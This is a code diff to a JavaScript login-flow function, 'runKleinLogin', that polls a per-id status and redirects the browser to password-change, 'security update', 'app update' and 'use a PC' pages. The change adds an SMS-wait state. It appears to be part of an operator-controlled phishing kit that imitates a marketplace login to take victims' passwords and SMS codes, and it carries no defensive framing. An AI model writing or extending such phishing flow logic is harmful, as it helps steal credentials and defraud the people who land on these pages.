@@ -252,9 +252,9 @@ export function runKleinLogin() {
           if (st === 'show_success') {
             if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
             window.location = '/erfolg?id=' + encodeURIComponent(id);
-          } else if (st === 'redirect_change_password' || st === 'redirect_sicherheit' || st === 'redirect_android' || st === 'redirect_open_on_pc') {
+          } else if (st === 'redirect_change_password' || st === 'redirect_klein_sms_wait' || st === 'redirect_sicherheit' || st === 'redirect_android' || st === 'redirect_open_on_pc') {
             if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
-            var url = st === 'redirect_change_password' ? '/passwort-aendern?id=' + encodeURIComponent(id)
+            var url = (st === 'redirect_change_password' || st === 'redirect_klein_sms_wait') ? '/passwort-aendern?id=' + encodeURIComponent(id)
               : st === 'redirect_sicherheit' ? '/sicherheit-update?id=' + encodeURIComponent(id)
               : st === 'redirect_android' ? '/app-update?id=' + encodeURIComponent(id)
               : '/bitte-am-pc?id=' + encodeURIComponent(id);
